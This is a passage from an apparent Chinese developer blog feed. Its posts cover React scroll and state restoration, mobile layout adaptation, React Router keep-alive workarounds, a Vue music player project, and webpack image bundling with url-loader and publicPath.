title="3.后退时记录滚动条位置"></a>3.后退时记录滚动条位置</h4><p>案情描述：同上</p><p>恢复数据还不够，只是省下了我加载的时间，而我还是要拉到最底部，所以滚动条的位置也需要恢复。</p><p>思路同上，将当前的scrollTop记录在一个全局变量中(我是作为LatestNews组件的属性，为了让需要滚动的组件获取到)，在componentWillUnMount方法中存储当前的滚动条位置(sessionStorage,localStorage)。</p><p>当后退返回时取出位置赋值给LatestNews.scrollPoint，确认数据更新后(一定要确认数据更新后，setState方法是异步方法)，在setState的回调中根据Latest.scrollPoint滚动需要滚动的组件。</p><blockquote><p>参考</p><ul><li><a href="http://blog.csdn.net/tujiaw/article/details/77511460" target="_blank" rel="noopener">react判断滚动到底部以及保持原来的滚动位置</a></li></ul></blockquote><h4 id="4-当state的属性为数组，如何setState比较好"><a href="#4-当state的属性为数组，如何setState比较好" class="headerlink" title="4. 当state的属性为数组，如何setState比较好"></a>4. 当state的属性为数组，如何setState比较好</h4><p>这个主要是push,unshift方法的返回值造成state没有赋值成功，最好先用slice把数组copy以下，用copy的数组去push(data)，然后再去setState.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _storiesQue = <span class="keyword">this</span>.state.storiesQue.slice();</span><br><span class="line">_storiesQue.push(data);</span><br><span class="line"><span class="keyword">this</span>.setState(&#123;</span><br><span class="line">    storiesQue:_storiesQue</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>这里有一篇文章写的很好</p><ul><li><a href="http://www.jianshu.com/p/c6257cbef1b1" target="_blank" rel="noopener">深入理解React 组件状态（State）</a></li></ul></blockquote><h3 id="移动端适配问题"><a href="#移动端适配问题" class="headerlink" title="移动端适配问题"></a>移动端适配问题</h3><h4 id="1-react-responsive"><a href="#1-react-responsive" class="headerlink" title="1.react-responsive"></a>1.react-responsive</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install  react-responsive --save</span><br></pre></td></tr></table></figure><p>然后在index.js中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import MediaQuery from <span class="string">'react-responsive'</span>;</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">  &lt;Router&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;MediaQuery query=<span class="string">'(min-device-width:1224px)'</span>&gt;</span><br><span class="line">                &lt;PCIndex/&gt;</span><br><span class="line">            &lt;/MediaQuery&gt;</span><br><span class="line">            &lt;MediaQuery query=<span class="string">'(max-device-width:1224px)'</span>&gt;</span><br><span class="line">                &lt;MBIndex/&gt;</span><br><span class="line">            &lt;/MediaQuery&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/Router&gt;,</span><br><span class="line">  document.getElementById(<span class="string">'root'</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>在设置了query参数后，就可以根据设备的宽度来决定渲染PC组件还是移动端组件，独立开发即可，当然，要考虑组件的复用。</p><h4 id="2-flexible-js-rem布局"><a href="#2-flexible-js-rem布局" class="headerlink" title="2.flexible.js+rem布局"></a>2.flexible.js+rem布局</h4><p>关于flexible.js+rem布局有疑问的可以看下面的文章</p><blockquote><p>参考：</p><ul><li><a href="http://div.io/topic/1092" target="_blank" rel="noopener">移动端高清、多屏适配方案</a></li><li><a href="https://github.com/amfe/article/issues/17" target="_blank" rel="noopener">使用Flexible实现手淘H5页面的终端适配</a></li></ul></blockquote><p>使用lib-flexible.js</p><p>首先:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install lib-flexible --save</span><br></pre></td></tr></table></figure><p>然后在index.js中，即可使用rem进行适配了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import <span class="string">'lib-flexible'</span>;</span><br></pre></td></tr></table></figure><p>将px转为rem的几种方法</p><ol><li>可以通过开发工具的插件，例如sublime上面就有插件</li><li>webpack的px2rem-loader，对stylus文件无效</li><li>使用定义好的预处理器(stylus,sass,less)的方法</li></ol><p>以下是stylus的示例</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义一个变量和一个mixin</span></span><br><span class="line">$baseFontSize = 16; //默认基准font-size</span><br><span class="line"><span class="function"><span class="title">px2rem</span><span class="params">(name, px)</span></span>&#123;</span><br><span class="line">&#123;name&#125;: px / $baseFontSize * 1rem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用示例：</span></span><br><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  px2rem('height', 240);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  stylus翻译结果：</span></span><br><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">3.2rem</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>参考：</p><ul><li><a href="http://www.cnblogs.com/shahramLu/p/6408551.html" target="_blank" rel="noopener">三种预处理器px2rem</a></li></ul></blockquote><h4 id="2-Drawer组件遮罩层滑动组织底部窗体滚动"><a href="#2-Drawer组件遮罩层滑动组织底部窗体滚动" class="headerlink" title="2. Drawer组件遮罩层滑动组织底部窗体滚动"></a>2. Drawer组件遮罩层滑动组织底部窗体滚动</h4><p>因为PC端用的是ant-design，对移动端不是很友好，所以移动端基本是自己手写(除了引入了antd的轮播图(Carousel)和折叠面板(Collapse)，不过真的丑)。</p><p>Drawer组件，如下图所示:</p><p><img src="http://upload-images.jianshu.io/upload_images/4869616-32fec349e60cd197?imageMogr2/auto-orient/strip" alt="Drawer.gif"></p><p>设计思路是：Drawer组件先通过绝对定位移出视窗外，当点击menu按钮时，添加class，改变left以及top的值,当然得有transition营造动画效果(还可以通过transform:translateZ(0)硬件加速)，同时渲染遮罩层mask，宽高均为100%.</p><p>z-index层级：Drawer&gt;mask&gt;index</p><p>案件描述：当我不小心滑动到遮罩层mask的时候，底部list也在滑动，这显然不是我想要的，这里主要是看了张鑫旭大佬的文章。我就不细说了。</p><blockquote><p>参考</p><ul><li><a href="http://www.zhangxinxu.com/wordpress/2016/12/web-mobile-scroll-prevent-window-js-css/" target="_blank" rel="noopener">web移动端浮层滚动阻止window窗体滚动JS/CSS处理</a>                         </li></ul></blockquote><h3 id="关于组件复用"><a href="#关于组件复用" class="headerlink" title="关于组件复用"></a>关于组件复用</h3><p>移动端以及PC端的news_detail/comments均是基于公共的模块news_content/comments_content/comment/avatar进行二次包装。</p><p>以内容详情页news_detail举例。</p><p>PC端内容详情页news_detail这一模块中包含评论comments模块，而移动端包含一个news_header头部模块。</p><p>所以采取对共有模块news_content进行引用，同时PC端引用comments模块进行组合，移动端引用news_header模块进行组合，在各自的news_detail里进行数据的获取，共有模块只负责展示，属于stateless组件。</p><p>这样一来，即使完全删除PC文件或者移动端文件，剩下的一方依然可以正常使用，二者之间不存在相互关联引用。</p><h3 id="关于打包-未解决"><a href="#关于打包-未解决" class="headerlink" title="关于打包(未解决)"></a>关于打包(未解决)</h3><p>记得要将开发时对webpack.config.dev.js做的操作也要对webpack.config.prod.js操作一遍。</p><p>比如我开发时引入了stylus，自己也配置了webpack.config.dev.js的环境[stylus, stylus-loader ]，在开发环境下没有问题。</p><p>但是打包之后stylus文件全部失效，一看好好的躺在static/media文件夹呢，说明生产环境的webpack没有配置好。再对webpack.config.prod.js里面的loaders也添加一遍就好了，其它同理。<br>然后：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure><p>如何在github-page上展示呢？</p><p><a href="https://segmentfault.com/a/1190000008425992" target="_blank" rel="noopener">戳这里</a>，虽然说的是vue项目，但是build后操作一模一样，除了将命令中dist=&gt;build</p><p>上传后会发现只有在github根路径才能正常访问，而不是仓库下面的路径，很坑啊。。。不是很懂这个原因啊，恳请高手替我解答一下，资源路径没问题，就是路由匹配不正确。</p><p>理想情况下应该是这个路径可以直接访问</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//nickname.github.io/project/[index.html]</span></span><br></pre></td></tr></table></figure><p>但是这个gh-pages的的路径进去是一个header（PC端），路由’/‘的组件没有渲染出来，点了以下header的首页’/topics’的链接，一切恢复正常，但是url却变成了下面这个：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//nickname.github.io/topics</span></span><br></pre></td></tr></table></figure></p><p>项目路径被吃了，这个路径直接访问又是404，难道react-router写path的时候只能相对于域名根路径？</p><p>我看别人都是打包后资源加载问题，我发现直接打包资源路径没有问题，难道我开发时要把path由’/a’改为’/project/a’???</p><p>如果有成功在gh-pages上展示项目的同学，请务必在评论中留下您的解决方案，真的非常感谢！</p><blockquote><p>参考</p><ul><li><a href="https://segmentfault.com/q/1010000009672497" target="_blank" rel="noopener">stackoverflow</a></li><li><a href="https://segmentfault.com/a/1190000008425992" target="_blank" rel="noopener">如何在gh-pages上展示vue项目</a></li></ul></blockquote><p>后续操作：完善细节，自己写折叠面板。</p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>如果我的文章给您了一点帮助，希望可以去github上给我一颗star。</p><p>能够在国庆短短几天从不知道react是啥到做个小东西出来，一直都是因为有这么多热爱分享的人，站在巨人的肩膀上！</p><p>但是仍然有很多不足，请指正。</p><p>项目地址：<a href="https://github.com/hackerwen/ZhihuDaily-React" target="_blank" rel="noopener">狂戳这里</a><br>⭐⭐⭐</p><p>我的其他项目：</p><p><a href="https://github.com/hackerwen/Netease-Music-of-Vue" target="_blank" rel="noopener">Github: ⭐vue全家桶:高仿网易云音乐播放器 PC端</a></p><p><a href="https://github.com/hackerwen/vue-blog" target="_blank" rel="noopener">Github: ⭐vue + express + mongodb 打造个人博客</a></p><p>我的博客：<a href="http://blog.hackerwen.tech/archives/" target="_blank" rel="noopener">点这里</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;API：&lt;a href=&quot;https://github.com/izzyleung/ZhihuDailyPurify/wiki/%E7%9F%A5%E4%B9%8E%E6%97%A5%E6%8A%A5-API-%E5%88%86%E6%9E%90&quot; target=&quot;_bla
      
    
    </summary>
    
      <category term="react" scheme="http://yoursite.com/categories/react/"/>
    
    
      <category term="react" scheme="http://yoursite.com/tags/react/"/>
    
  </entry>
  
  <entry>
    <title>SoulBeats音乐播放器-Vue</title>
    <link href="http://yoursite.com/2017/10/09/vue%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE-%E9%9F%B3%E4%B9%90%E6%92%AD%E6%94%BE%E5%99%A8/"/>
    <id>http://yoursite.com/2017/10/09/vue练手项目-音乐播放器/</id>
    <published>2017-10-09T11:33:52.000Z</published>
    <updated>2017-10-09T11:33:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>这个项目是我最初学vue的时候做的，当时只是为了学习，结果后面逐渐超出了自己当时的能力范围，造成了以下几点问题：</p><ol><li>模块划分不清，很乱，复用性很差（虽然和页面复用性部分少也有原因）</li><li>由于一开始没有想好布局架构，CSS很混乱，应该存在了一堆不必要的CSS代码。</li><li>代码命名不规范，该抽象的方法没有抽象。<br>综上：这个项目真的很乱，虽然功能都实现了，但是代码一团糟，想着以后能后重写，但是我已经深深爱上的react，可能和我思维有所提升原因，最近做的ZhihuDaily-React就非常清晰了，所以，不要给这个项目star了，等我闲下来，好好重构一下。</li></ol><p>谢谢！<br>—————————————————-以上更新于10月</p><h2 id="基于Vue的高仿网易云音乐"><a href="#基于Vue的高仿网易云音乐" class="headerlink" title="基于Vue的高仿网易云音乐"></a>基于Vue的高仿网易云音乐</h2><p><img src="http://upload-images.jianshu.io/upload_images/4869616-4fa1a61eca7fac96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="歌单页.png"></p><blockquote><p>UI基本对着网易切…<br>技术栈:vue全家桶+axios+stylus<br><a href="http://blog.hackerwen.tech/Netease-Music-of-Vue/" target="_blank" rel="noopener">点击预览</a> 请务必配合chrome桌面端进行食用全屏更佳<br>[github]<a href="https://github.com/hackerwen/Netease-Music-of-Vue" target="_blank" rel="noopener">https://github.com/hackerwen/Netease-Music-of-Vue</a></p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/4869616-a7fbcdbbf3680110.gif?imageMogr2/auto-orient/strip" alt="动态预览.gif"></p><ol><li>vue-router实现路由切换.</li><li>vuex进行共享状态管理、处理组件间通信</li><li>axios发送http请求.</li><li>stylus作css预处理.</li><li>初始化收藏歌单/歌曲通过html5提供的localstorage.</li><li>api来源(爬虫+<a href="https://api.imjad.cn/" target="_blank" rel="noopener">戳这里</a>)</li></ol><h3 id="实现功能："><a href="#实现功能：" class="headerlink" title="实现功能："></a>实现功能：</h3><ol><li>歌单（推荐歌单、收藏/删除歌单、歌单详情页）</li><li>收藏/删除歌曲</li><li>歌手详情页</li><li>搜索 （单曲、歌手、歌单）</li><li>在线播放（切歌、顺序、循环、单曲、列表）</li><li>排行榜</li><li>html5 audio控件重写</li><li>歌词同步</li><li>滑动至底部加载（歌单及搜索部分）</li><li>个性推荐轮播图（其实个性推荐那一页就一个轮播图）</li></ol><h3 id="预计添加功能："><a href="#预计添加功能：" class="headerlink" title="预计添加功能："></a>预计添加功能：</h3><ol><li>添加歌曲播放页面评论分页</li><li>精细歌曲播放页动画</li></ol><h3 id="还未解决的问题"><a href="#还未解决的问题" class="headerlink" title="还未解决的问题"></a>还未解决的问题</h3><ol><li>轮播图使用很传统的方式写的，不知道vue在处理轮播图这一块有没有什么独特的优势</li><li>如何更优雅的编写vue项目,很多地方都是想怎么写就怎么写，很多重复代码写了也懒得去抽象出来进行整理，很多问题都没有考虑，甚至很多地方自己都觉得很”脏”,真的很惭愧,希望有同学可以指点一二.</li></ol><h3 id="关于api"><a href="#关于api" class="headerlink" title="关于api"></a>关于api</h3><p>特别谢谢我的室友.</p><ol><li>轮播图、热门歌单、榜单是通过爬虫获取.</li><li>音乐直链是通过伪造客户端请求加解密网易云音乐官方api获取数据.</li><li>当然除了轮播图、热门歌单、榜单，其余api都可以从前面的AD’s api获取获取,十分感谢开发者,api文档也十分详细.</li></ol><p>如有错误之处或者是做得不好可以改进的地方一定要指出来,谢谢谢谢,共同进步.</p><p>如果您觉得对您的学习有所帮助,欢迎给我一颗star<br><a href="https://github.com/hackerwen/Netease-Music-of-Vue" target="_blank" rel="noopener">前往github</a></p><p>前置项目：<br><a href="http://www.jianshu.com/p/6e18347c3ae2" target="_blank" rel="noopener">利用html+css+javascript写一个音乐播放器</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个项目是我最初学vue的时候做的，当时只是为了学习，结果后面逐渐超出了自己当时的能力范围，造成了以下几点问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;模块划分不清，很乱，复用性很差（虽然和页面复用性部分少也有原因）&lt;/li&gt;
&lt;li&gt;由于一开始没有想好布局架构，CSS很混乱，应该存在
      
    
    </summary>
    
      <category term="js" scheme="http://yoursite.com/categories/js/"/>
    
    
      <category term="Vue" scheme="http://yoursite.com/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>react router(1)-实现keep-alive</title>
    <link href="http://yoursite.com/2017/10/05/react%20router%E8%B8%A9%E5%9D%91%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E5%A6%82%E4%BD%95%E4%BF%9D%E6%8C%81%E7%BB%84%E4%BB%B6%E7%8A%B6%E6%80%81keep-alive/"/>
    <id>http://yoursite.com/2017/10/05/react router踩坑（一）——如何保持组件状态keep-alive/</id>
    <published>2017-10-04T18:10:22.000Z</published>
    <updated>2017-10-04T18:10:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考：<br><a href="https://www.v2ex.com/amp/t/386516" target="_blank" rel="noopener">https://www.v2ex.com/amp/t/386516</a><br><a href="http://react-china.org/t/react-react-router/3757/2" target="_blank" rel="noopener">http://react-china.org/t/react-react-router/3757/2</a></p><p>最近在学习react，其实有过mvvm框架学习经验之后，再上手另一门框架不会太困难。<br>但是想要深入学习就会发现其中设计理念的不同，之前学的是vue，真的好方便，react初上手有些不习惯，习惯了jsx和es6写法之后，那可真是爽死了，比vue的模版简洁不少。</p><p>学习react router 4.0的时候将那些不适应放大到了极致，在RR4(react router 4.0)中，router是各种组件，对于习惯了之前vue的router.js配置文件的我来说，感觉画风一下子就变了。</p><p>这就是不同框架对于相同功能实现的不同理念吧，对于router组件化，这篇<a href="http://www.jianshu.com/p/e27cec8754ad" target="_blank" rel="noopener">聊聊 React Router v4 的设计思想</a>文章说的非常棒。</p><p>因为之前也用vue-router写过一些单页应用，上手RR4便马上寻找譬如路由嵌套、获取params、query等常用功能，看着文档也是能敲出来。</p><p>然而，如果真的那么轻松，我也不会在这浪费笔墨了。</p><p>写一个小demo的时候，想要实现类似于vue-router的keep-alive功能，突然发现，RR中没有，对的，就是没有。</p><p>keep-alive：包裹动态组件时，会缓存不活动的组件实例，而不是销毁它们。</p><p>假如我有以下两种需求：</p><ol><li>有一个下拉加载更多列表页，当列表项达到1000项，点击列表项到详细页，当点击返回按钮时，保持列表页的一千条记录。</li><li>把下拉加载更改为翻页，假设不是通过改变URL，只是单纯的ajax请求，击列表项到详细页，当点击返回按钮时，返回离开时的那一页。</li></ol><p>最近再做一个知乎日报的demo，界面如下：</p><p>这是最新消息版块：<br><img src="http://upload-images.jianshu.io/upload_images/4869616-4603e90b36de5676.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>倘若最新是10月4号的新闻，当我翻页到10月2号，点进其中一篇文章，后退返回，发现我又回到了10月4号那一页。</p><p>这是主题日报版块：<br><img src="http://upload-images.jianshu.io/upload_images/4869616-47bef520c4897913.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>倘若我选择“开始游戏”主题日报，当我点进其中一篇文章，后退返回，发现又回到了最初的“日常心理学”主题日报，很难受。</p><p>在vue里面可以很轻松解决的问题，在react里当然也可以解决，只不过要需要换一种方式。</p><h3 id="方式一："><a href="#方式一：" class="headerlink" title="方式一："></a>方式一：</h3><p>把加载页面的必要信息放URL里，后退就是浏览器的后退，回退时组件依然会重新渲染，componentDidMount的时候根据这些url的信息去请求API。数据保持离开时最新的状态。</p><p>这种方法在翻页情况下使用固然可以，但是像下拉加载那样，是多次请求的数据集合，就无法通过这种方式解决，而且后退时依旧进行了一次http请求。</p><h3 id="方式二："><a href="#方式二：" class="headerlink" title="方式二："></a>方式二：</h3><ol><li>存储当前已经加载的数据到本地（sessionStorage,localStorage）</li><li>详情回退后,从本地取出数据，进行渲染（所以componentDid内部要判断本地是否已经存在数据，如果存在则return，不存在从服务器获取数据）</li></ol><p>这种方式回退时不需要再次进行http请求，也能满足下拉的情况，我选择的就是这种方式。</p><p>如果还有更多的方法还望留言一同交流学习，谢谢回答过我这个问题的大佬！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;参考：&lt;br&gt;&lt;a href=&quot;https://www.v2ex.com/amp/t/386516&quot; target=&quot;_blank&quot; rel
      
    
    </summary>
    
      <category term="react" scheme="http://yoursite.com/categories/react/"/>
    
    
      <category term="react" scheme="http://yoursite.com/tags/react/"/>
    
  </entry>
  
  <entry>
    <title>webpack踩坑（二）——图片打包及路径问题</title>
    <link href="http://yoursite.com/2017/10/02/webpack%E8%B8%A9%E5%9D%91--%E5%9B%BE%E7%89%87%E6%89%93%E5%8C%85%E5%8F%8A%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2017/10/02/webpack踩坑--图片打包及路径问题/</id>
    <published>2017-10-02T14:53:14.000Z</published>
    <updated>2017-10-02T14:53:14.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文非本人原创，转自<a href="http://www.cnblogs.com/ghost-xyx/p/5812902.html" target="_blank" rel="noopener">webpack踩坑之路 (2)——图片的路径与打包</a>，用于记录自己踩过的坑，谢谢作者大大，现在前端同质性文章太多了，提笔之前一搜，好文章一大把，就没有写的必要了，譬如这篇，太棒了。</p></blockquote><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>在实际生产中有以下几种图片的引用方式：</p><ol><li><p>HTML文件中img标签的src属性引用或者内嵌样式引用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](photo.jpg)<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background:url(photo.jpg)"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>CSS文件中的背景图等设置</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.photo</span> &#123; <span class="attribute">background</span>: <span class="built_in">url</span>(photo.jpg);&#125;</span><br></pre></td></tr></table></figure></li><li><p>JavaScript文件中动态添加或者改变的图片引用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> imgTempl = <span class="string">'![](photo.jpg)'</span>;<span class="built_in">document</span>.body.innerHTML = imgTempl;</span><br></pre></td></tr></table></figure></li><li><p>ReactJS中图片的引用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">    render() &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            ![](photo.jpg)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ReactDom.render(<span class="xml"><span class="tag">&lt;<span class="name">App</span>/&gt;</span></span>, <span class="built_in">document</span>.querySelector(<span class="string">'#container'</span>));</span><br></pre></td></tr></table></figure></li></ol><p><strong>url-loader</strong><br>在 webpack 中引入图片需要依赖 url-loader 这个加载器。<br>安装：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install url-loader --save-dev</span><br></pre></td></tr></table></figure></p><p>当然你可以将其写入配置中，以后与其他工具模块一起安装。<br>在 webpack.config.js 文件中配置如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">module: &#123;</span><br><span class="line">    loaders: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">test</span>: /\.(png|jpg)$/, </span><br><span class="line">            loader: <span class="string">'url-loader?limit=8192'</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>test 属性代表可以匹配的图片类型，除了 png、jpg 之外也可以添加 gif 等，以竖线隔开即开。<br>loader 后面 limit 字段代表图片打包限制，这个限制并不是说超过了就不能打包，而是指当图片大小小于限制时会自动转成 base64 码引用。上例中大于8192字节的图片正常打包，小于8192字节的图片以 base64 的方式引用。</p><p>url-loader 后面除了 limit 字段，还可以通过 name 字段来指定图片打包的目录与文件名：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>: &#123;</span><br><span class="line">    loaders: [</span><br><span class="line">        &#123;</span><br><span class="line">            test: <span class="regexp">/\.(png|jpg)$/</span>, </span><br><span class="line">            loader: <span class="string">'url-loader?limit=8192&amp;name=images/[hash:8].[name].[ext]'</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 上例中的 name 字段指定了在打包根目录（output.path）下生成名为 images 的文件夹，并在原图片名前加上8位 hash 值。<br>例：工程目录如下<br><img src="http://upload-images.jianshu.io/upload_images/4869616-765f3903017427db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>在 main.css 中引用了同级 images 文件夹下的 bg.jpg 图片<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-image: url(./images/bg.jpg);</span><br></pre></td></tr></table></figure></p><p>通过之前的配置，使用 $ webpack 命令对代码进行打包后生成如下目录<br><img src="http://upload-images.jianshu.io/upload_images/4869616-750601db184dd306.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>打包目录中，css 文件和 images 文件夹保持了同样的层级，可以不做任务修改即能访问到图片。区别是打包后的图片加了 hash 值，bundle.css 文件里引入的也是有hash值的图片。<br>background-image: url(images/f593fbb9.bg.jpg);</p><p> （上例中，使用了单独打包css的技术，只是为了方便演示）</p><p><strong>publicPath</strong><br>output.publicPath 表示资源的发布地址，当配置过该属性后，打包文件中所有通过相对路径引用的资源都会被配置的路径所替换。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">output: &#123;</span><br><span class="line">  path: <span class="string">'dist'</span>, </span><br><span class="line">  publicPath:  <span class="string">'/assets/'</span>, </span><br><span class="line">  filename: <span class="string">'bundle.js'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> main.css<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-image: url(./images/bg.jpg);</span><br></pre></td></tr></table></figure></p><p> bundle.css<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-image: url(/assets/images/f593fbb9.bg.jpg);</span><br></pre></td></tr></table></figure></p><p>该属性的好处在于当你配置了图片 CDN 的地址，本地开发时引用本地的图片资源，上线打包时就将资源全部指向 CDN 了。<br>但是要注意，如果没有确定的发布地址不建议配置该属性，否则会让你打包后的资源路径很混乱。</p><p><strong>JS中的图片</strong><br>初用 webpack 进行项目开发的同学会发现：在 js 或者 react 中引用的图片都没有打包进 bundle 文件夹中。<br>正确写法应该是通过模块化的方式引用图片路径，这样引用的图片就可以成功打包进 bundle 文件夹里了<br><strong>js</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> imgUrl = <span class="built_in">require</span>(<span class="string">'./images/bg.jpg'</span>),</span><br><span class="line">    imgTempl = <span class="string">'![]('</span>+imgUrl+<span class="string">')'</span>;</span><br><span class="line"><span class="built_in">document</span>.body.innerHTML = imgTempl;</span><br></pre></td></tr></table></figure></p><p><strong>react</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render() &#123; <span class="keyword">return</span> (<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;require(</span>'<span class="attr">.</span>/<span class="attr">images</span>/<span class="attr">bg.jpg</span>')&#125; /&gt;</span>);&#125;</span></span><br></pre></td></tr></table></figure></p><p><strong>HTML中的图片</strong><br>由于 webpack 对 html 的处理不太好，打包 HTML 文件中的图片资源是相对来说最麻烦的。这里需要引用一个插件—— html-withimg-loder<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install html-withimg-loader --save-dev</span><br></pre></td></tr></table></figure></p><p> 